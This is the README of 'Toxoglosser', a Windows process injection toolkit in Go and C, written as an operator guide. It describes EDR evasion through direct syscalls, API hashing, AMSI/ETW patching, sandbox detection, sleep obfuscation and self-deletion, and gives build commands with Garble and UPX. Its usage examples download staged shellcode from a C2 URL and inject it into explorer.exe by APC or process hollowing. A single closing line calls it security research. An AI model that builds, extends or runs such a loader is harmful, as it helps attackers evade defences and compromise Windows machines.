# Toxoglosser: Advanced Process Injection Toolkit

## Project Overview

Toxoglosser is a sophisticated Windows process injection tool written in Go with embedded C code. It implements cutting-edge EDR evasion techniques to inject staged payloads into target processes while evading modern security solutions. The project is specifically designed for 64-bit Windows systems and incorporates multiple advanced evasion techniques including direct syscalls, API hashing, and advanced memory allocation strategies.

### Key Features

1. **Tartarus' Gate Direct Syscalls**: Advanced direct syscall framework with randomized stub generation at runtime, bypassing all user-mode hooks
2. **Manual API Resolution**: Complete elimination of LazyDLL usage via GetModuleHandle + GetProcAddress hashing
3. **Multiple Injection Techniques**: Supports Early Bird APC injection, process hollowing, and traditional methods
4. **Enhanced EDR Evasion**: Implements unhooking-based AMSI/ETW bypass, direct syscalls, and advanced sandbox detection
5. **Memory Protection**: Uses safe RX memory allocation (RW→RX) instead of suspicious RWX
6. **Staged Payload Loading**: Removes static shellcode signatures, loads payloads from C2 server as primary method
7. **String Obfuscation**: Encrypts/obfuscates API calls and strings to avoid static signatures
8. **Build Optimization**: Garble obfuscation, size reduction, UPX compression support

## Architecture

The tool is organized into several modules:

- `core/` - Injection techniques, syscall implementations, and manual API resolution
- `evasion/` - Unhooking-based AMSI/ETW bypass functions
- `anti/` - Anti-analysis and sandbox detection
- `utils/` - Sleep obfuscation, obfuscation, timing, and utility functions
- `payloads/` - Payload handling and encryption
- `cmd/` - Command-line interface and main entry point

## Building and Running

### Prerequisites

- Go (v1.20 or later) - Required for proper cross-compilation and build constraints
- Garble (v0.9.3 or later) for obfuscation
- UPX (optional, for size reduction)
- MinGW-w64 cross-compiler for Windows (if building from Linux)
- Shellcode file (shell.bin) in the project root (for enhanced version)

### Build Commands

#### Standard Build
```bash
# Make build script executable
chmod +x build.sh

# Run the build script
./build.sh
```

#### Using Make
```bash
make build                # Build with Garble obfuscation (recommended)
make build-plain          # Build without obfuscation
make build-compressed     # Build and compress with UPX
make cross-build          # Cross-compile for Windows from Linux
make install-garble       # Install Garble obfuscator
```

#### Manual Build Commands

##### Basic Build
```bash
go build -ldflags="-s -w" -buildmode=pie -trimpath -o toxoglosser.exe toxoglosser.go
```

##### With Garble Obfuscation
```bash
garble -tiny -literals -seed=random build -ldflags="-s -w" -buildmode=pie -trimpath -o toxoglosser.exe toxoglosser.go
```

##### Cross-compilation from Linux to Windows
```bash
# Install prerequisites
# On Ubuntu/Debian: sudo apt install gcc-mingw-w64-x86-64

# Set environment variables
export CGO_ENABLED=1
export CC=x86_64-w64-mingw32-gcc
export GOOS=windows
export GOARCH=amd64

# Build command
garble -tiny -literals -seed=random build -ldflags="-s -w" -buildmode=pie -trimpath -o toxoglosser.exe toxoglosser.go
```

## Usage

```
.\toxoglosser.exe [OPTIONS]
```

### Options

- `-url <url>`: URL to fetch the staged payload from (primary method)
- `-file <path>`: Path to the shellcode file to execute (fallback method)
- `-key <key>`: Key to decrypt staged payload if encrypted
- `-pname <name>`: Name of the target process
- `-pid <pid>`: PID of the target process
- `-technique <apc|hollow|doppel>`: Injection technique to use
- `-delay <seconds>`: Delay with jitter before execution
- `-v`: Enable verbose output
- `-ah`: Use alternative process hunting technique
- `-selfdelete`: Delete the executable after execution

### Examples

- Default behavior with staged payload: `.\toxoglosser.exe -url http://c2-server.com/payload.bin -pname explorer.exe`
- Load shellcode from file: `.\toxoglosser.exe -file payload.bin -pname explorer.exe`
- Download from URL with APC injection: `.\toxoglosser.exe -url http://c2-server.com/payload.bin -technique apc -pid 1234`
- Process hollowing with delay: `.\toxoglosser.exe -url http://c2-server.com/payload.bin -technique hollow -delay 10 -v`

## Development Conventions

1. **API Resolution**: All Windows API calls are resolved manually using hashing to avoid LazyDLL usage
2. **Direct Syscalls**: Critical system calls use direct syscalls via Tartarus' Gate technique
3. **Memory Management**: Always use RW→RX memory protection pattern, never RWX
4. **Obfuscation**: String obfuscation using XOR and AES encryption where applicable
5. **Sandbox Detection**: Implement multiple checks to identify virtualized/analysis environments
6. **OPSEC**: Staged payload loading is the primary method to avoid static signatures
7. **Error Handling**: Comprehensive error handling with graceful fallbacks

## Evasion Techniques Implemented

### Direct Syscalls
Instead of using user-mode API functions that are commonly hooked by EDR solutions, Toxoglosser calls Windows NT system calls directly, bypassing user-mode hooks.

### Early Bird APC Injection
This technique creates a suspended process, injects the payload, and queues an Asynchronous Procedure Call (APC) to execute the payload in the context of the suspended process thread before it starts running normally.

### AMSI/ETW Bypass
Before executing the payload, the tool patches critical Windows functions to prevent in-memory scanning and event logging that would detect the malicious activity.

### RX Memory Allocation
The tool allocates memory with RW (Read/Write) permissions, writes the payload, then changes permissions to RX (Read/Execute), avoiding the suspicious RWX (Read/Write/Execute) permissions that trigger security alerts.

### Sleep Obfuscation
Ekko-style sleep obfuscation to evade memory scanners, avoiding direct Sleep/Wait functions that trigger alerts.

## Code Structure Notes

1. The project uses CGO for low-level Windows API calls and ROP chain generation
2. API resolution is implemented using string hashing to avoid static analysis
3. Payloads are handled with AES encryption/decryption capabilities
4. Several different injection techniques are implemented with pluggable modules
5. Comprehensive sandbox detection with multiple checks

## Compilation Notes

The following fixes were applied to ensure successful compilation:

### Common Issues and Solutions:
- **Duplicate declarations**: Fixed duplicate `kernel32` variable declarations across files by using unique names
- **Type mismatches**: Resolved conflicts between `syscall.Handle` and `golang.org/x/sys/windows.Handle` types
- **Structure redefinitions**: Removed duplicate PE structure definitions from multiple files
- **Import errors**: Fixed unused import statements and import cycles across packages
- **Windows API calls**: Replaced unavailable Windows APIs with manual syscall implementations

### Required Prerequisites:
- Install MinGW-w64 cross-compiler for Windows target
- Set appropriate environment variables: `CGO_ENABLED=1`, `GOOS=windows`, `GOARCH=amd64`
- Use the correct compiler: `CC=x86_64-w64-mingw32-gcc`
- Update Go to v1.20+ to meet build constraint requirements
- Reinstall Garble with the newer Go version to ensure compatibility

## Security Considerations

This is a security research tool designed for studying modern process injection and evasion techniques. All functionality is focused on Windows security bypasses.